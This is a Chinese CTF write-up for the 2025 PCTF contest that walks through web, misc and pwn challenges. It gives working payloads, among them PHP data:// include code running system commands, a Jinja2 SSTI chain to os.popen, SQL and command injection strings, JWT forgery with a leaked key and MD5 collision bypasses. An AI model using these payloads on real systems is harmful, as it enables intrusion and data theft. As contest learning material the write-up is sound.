+++
date = '2025-11-30T21:09:19+08:00'
title = '2025 PCTF WriteUp'
showToc = true
tags = ['ctf', 'write up']
+++

## Web

### EZPHP

爆破数字，为 114514，然后发送 POST 请求 http://challenge2.pctf.top:31855/?number=114514&action=include，`filename=data://text/plain,<?php system('ls -a /'); ?>`，看下 flag 在 `2t9I0T6BaYFEZGqu` 这个文件里，然后再发送一个 `data://text/plain,<?php system('cat /2t9I0T6BaYFEZGqu'); ?>` 即可拿到 flag。

### Jwt_password_manager

打开 `app.py`，发现 `SECRET_KEY` 都给了，访问 [jwt.io](https://jwt.io/)，找到 JWT Encoder，把 payload 改成 `{ 'username': 'admin' }`，把 `SECRET_KEY` 填进去，把得到的 token 写到 cookie 里面，即可以 admin 的身份登录并拿到 flag。

### We_will_rockyou

在网上找 rockyou.txt，逐个爆破，用户名是 `admin123`，密码是 `lovers`（每次的密码都不一样），进入仪表盘后运行 `ls` 发现 `flag.txt`，由于这个命令检查只检查第一个命令，所以运行 `ls ;cat flag.txt`，发现 `PCTF{flag_is_not_here}`，再看题目发现 flag 原来在 `/flag`，修改后重新运行命令拿到 flag。

### php_with_md5

先通过弱比较，然后再碰撞通过强比较。

`if(isset($_GET['begin'])=='admin')` 只需 `begin` 存在即可。

`if(!preg_match('/admin/i',$begin))` 只需 `begin` 不包含 `admin` 即可，因此输入 `123`。

`if($_POST['password']==md5($_POST['password']))` 用弱比较绕过即可，若一个字符串的 MD5 哈希值以 0e 开头，且后面全是数字，PHP 会将其当作科学计数法，结果为 0。`md5('0e215962017') = '0e291242476940776845150308577824'`，两边都以 `0e` 开头且后面是数字，可以绕过。

`if($_GET['a']!=$_GET['b'] && md5($_GET['a'])==md5($_GET['b']))` 也是利用弱比较绕过，`md5('QNKCDZO') = '0e830400451993494058024219903391'`，`md5('240610708') = '0e462097431906509019562988736854'`，两个值不相同、都是 `0e` 开头且后面为数字，弱比较通过。

`if($_GET['c']!=$_GET['d'] && md5($_GET['c'])===md5($_GET['d']))` 要求强相等，在网上搜索发现存在这样的两个值 `M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2` 和 `M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2` 值不相等但 md5 值相等。

发送这个 POST 请求
```http
POST /?begin=123&a=QNKCDZO&b=240610708&c=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&d=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 HTTP/1.1
Host: challenge2.pctf.top:30956
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

password=0e215962017&cmd=system('cat%20%2Fflag')%3B
```
即可拿到 flag。

### sql_in

用户名填 `admin' OR '1'='1`，密码随便填即可拿到 flag。

### 复读机

先输入 `{{ config }}` 看一下，发现 SSTI 可以执行，但没看到 flag。

用这个 SSTI 语句可以执行命令 `{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('命令').read()") }}{% endif %}{% endfor %}`

先执行 `ls -a` 看一下，没找到 flag，在根目录和 `app.py` 也没找到。

然后执行 `printenv` 看一下环境变量，找到 flag 了。

### Do_you_know_session?

打开开发者工具查看 Cookie 发现一串 session，base64 转码后是 `{ 'user': 'guest' }`，在搜索中输入 `{{ config }}` 就可以看到 `SECRET_KEY`，用这个 key 转码 `{ 'user': 'admin' }` 得到新的 session 在写到 cookie 里面即可以 admin 的身份读取文件，然而 flag 在环境变量里，读取 `/proc/self/environment` 即可拿到 flag。

### what_is_jsfuck

打开开发者工具，看到要先输入 I want flag，然后把得到的 jsfuck 代码输入到控制台执行即可拿到 flag。

## Misc

### 签到

PCTF{Welcome_tO_PCTF_2025_!!!!}

### ai_starts_from_here

这一串数字是 token，从网上下载 deepseek 的 token 词表再替换即可拿到 flag。

### 仍旧物理作业

把后缀名改为 `.zip` 再解压，发现里面没有 `document.xml` 但是有 `word.xml`，打开可以看到在“这里是物理作业”和下面的几个公式下面，有一连串的 `<w:tab />` 和 `<w:t xml:space="preserve">中间有若干空格</w:t>` 的组合，怀疑是摩斯电码，解码后得到 flag。

### ez_forensic

用 7-Zip 一次性把所有 `.bak` 文件解压，打开电话设置里的 `_tmp_meta` 文件，发现里面有 `cezanne` 的字样，在网上搜索为 Redmi_K30_Ultra。

打开 WLAN 设置看到里面的 wifi 里有一个叫 nubia Z60 Ultra 的热点，是嫌疑人的另一部手机。

查看 `descript.xml`，发现有一个 `com.v2ray.ang` 没有备份。

打开天气，发现有经纬度字样：`"longtitude\":\"109.786\",\"latitude\":\"26.908\"`。

在 Google Earth 的 `sp` 文件夹下的 `com.google.android.flutter.plugins.ssoauth.xml` 文件里找到邮箱 zhengzha777@gmail.com。

### ez_sql

用 Wireshark 打开，发现这是一串 sql 盲注的流量，启用过滤器 http，把一些其他请求剔除掉，计算每个从请求到响应的时间，如果接近 0.5 秒，则为盲注成功，否则为盲注失败，把所有盲注成功的语句拿到一块分析，即可拿到 flag。

## Pwn

### test_your_nc

这是一道任意进制转换+运算的题，编写脚本即可。

```python
from pwn import *
import re
import time

# 进制转换
def int_to_base(n: int, base: int) -> str:
    if not (2 <= base <= 36):
        raise ValueError("Base must be between 2 and 36")
    if n == 0:
        return "0"
    digits = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    sign = "-" if n < 0 else ""
    n = abs(n)
    result = []
    while n > 0:
        result.append(digits[n % base])
        n = n // base
    return sign + "".join(reversed(result))

# 正则表达式：匹配题目格式 [XXXX] (base B) N1 OP N2 = ?
QUESTION_PATTERN = r"\[(\d{4})\] \(base (\d+)\) ([A-Za-z0-9\-]+) ([\+\-\*\%]) ([A-Za-z0-9\-]+) = \?"

def split_lines(data: str) -> list:
    return re.split(r"[\r\n]+", data.strip())

def solve():
    p = remote("challenge2.pctf.top", 31719, timeout=60)
    log.info("连接成功，等待第一题...")

    buffer = b""
    while True:
        try:
            data = p.recv(4096, timeout=5)
            if not data:
                log.warning("未收到数据，重试...")
                time.sleep(0.5)
                continue
            buffer += data
            if b"[0001]" in buffer.lower():
                log.info("找到第一题，开始答题流程！")
                break
        except Exception as e:
            log.warning(f"读取欢迎信息异常：{str(e)}，重试...")
            time.sleep(0.5)

    # 初始化缓冲区和剩余行
    buffer_str = buffer.decode("ascii", errors="ignore")
    remaining_lines = split_lines(buffer_str)
    correct_count = 0

    for idx in range(2025):
        try:
            target_number = f"[{idx+1:04d}]"
            current_question = ""
            merging = False
            extra_content = ""

            while True:
                while remaining_lines:
                    line = remaining_lines[0].strip()
                    if not merging and line.startswith(target_number):
                        merging = True
                        current_question += line
                        remaining_lines.pop(0)
                    elif merging:
                        current_question += line
                        remaining_lines.pop(0)
                        if "= ?" in current_question:
                            eq_pos = current_question.find("= ?")
                            extra_content = current_question[eq_pos+3:]
                            current_question = current_question[:eq_pos+3].strip()
                            current_question = re.sub(r"\s+", " ", current_question)
                            if extra_content.strip():
                                remaining_lines.insert(0, extra_content.strip())
                            break
                    else:
                        remaining_lines.pop(0)
                if merging and "= ?" in current_question:
                    break
                data = p.recv(4096, timeout=5)
                if not data:
                    log.error(f"第{idx+1}题未找到完整题目，超时退出".replace("%", "%%"))
                    p.close()
                    return
                buffer_str += data.decode("ascii", errors="ignore")
                remaining_lines += split_lines(buffer_str)
                buffer_str = ""
                
            match = re.fullmatch(QUESTION_PATTERN, current_question)
            if not match:
                safe_question = current_question.replace("%", "%%")
                log.error(f"第{idx+1}题解析失败: {safe_question}")
                break
            base = int(match.group(2))
            num1_str = match.group(3)
            op = match.group(4)
            num2_str = match.group(5)

            num1 = int(num1_str, base)
            num2 = int(num2_str, base)
            if op == "+":
                res = num1 + num2
            elif op == "-":
                res = num1 - num2
            elif op == "*":
                res = num1 * num2
            elif op == "%":
                res = num1 % num2
            else:
                log.error(f"第{idx+1}题未知运算符: {op}".replace("%", "%%"))
                break
            answer = int_to_base(res, base)

            prompt_found = False
            while not prompt_found:
                if remaining_lines:
                    line = remaining_lines[0].strip()
                    if "Your answer" in line and f"base {base}" in line:
                        remaining_lines.pop(0)
                        prompt_found = True
                    else:
                        remaining_lines.pop(0)
                else:
                    data = p.recv(4096, timeout=5)
                    if not data:
                        log.error(f"第{idx+1}题未收到输入提示，超时退出".replace("%", "%%"))
                        p.close()
                        return
                    buffer_str += data.decode("ascii", errors="ignore")
                    remaining_lines += split_lines(buffer_str)
                    buffer_str = ""

            p.sendline(answer.encode("ascii"))
            time.sleep(0.02)

            feedback = ""
            feedback_keywords = ("Correct!", "Incorrect", "Invalid", "Empty")
            while not feedback:
                if remaining_lines:
                    line = remaining_lines[0].strip()
                    if any(keyword in line for keyword in feedback_keywords):
                        feedback = line
                        remaining_lines.pop(0)
                    else:
                        remaining_lines.pop(0)
                else:
                    data = p.recv(4096, timeout=10)
                    if not data:
                        log.error(f"第{idx+1}题未收到反馈，超时退出".replace("%", "%%"))
                        p.close()
                        return
                    buffer_str += data.decode("ascii", errors="ignore")
                    remaining_lines += split_lines(buffer_str)
                    buffer_str = ""
                    
            if "Correct!" in feedback:
                correct_count += 1
                if (idx + 1) % 100 == 0:
                    log.info(f"进度：{idx+1}/2025 题，正确率 {correct_count}/{idx+1}")
            else:
                safe_feedback = feedback.replace("%", "%%")
                safe_question = current_question.replace("%", "%%")
                log.error(f"第{idx+1}题错误：反馈={safe_feedback}，题目={safe_question}，答案={answer}")
                break

        except Exception as e:
            safe_msg = str(e).replace("%", "%%")
            log.error(f"第{idx+1}题执行异常: {safe_msg}")
            p.close()
            return

    if correct_count == 2025:
        log.success("全部题答对。")
    else:
        log.error(f"答题结束：答对{correct_count}/2025题，未拿到flag".replace("%", "%%"))

    p.close()

if __name__ == "__main__":
    context.log_level = "debug"
    solve()
```

### type_err

打开 IDA，看到 `obfuscate_value` 函数将 value的每个字节与 `0xAA` 异或，结果存入 `buffer`。

题目中 hint 由 0x80000000 异或生成，因此要使输入 b 的异或结果与 hint 匹配，b 必须等于 0x80000000（十进制 2147483648）。

当 unsigned int a ≥ 0x80000000 时，转换为 int 会溢出，结果为负数补码（例如 0x80000000 → int 是 -2147483648，0x80000001 → int 是 -2147483647），均满足 < -4。

因此，第一个输入 a：2147483648（0x80000000），第二个输入 b：2147483648（0x80000000），即可拿到 shell，再执行 `cat /flag` 即可拿到 flag。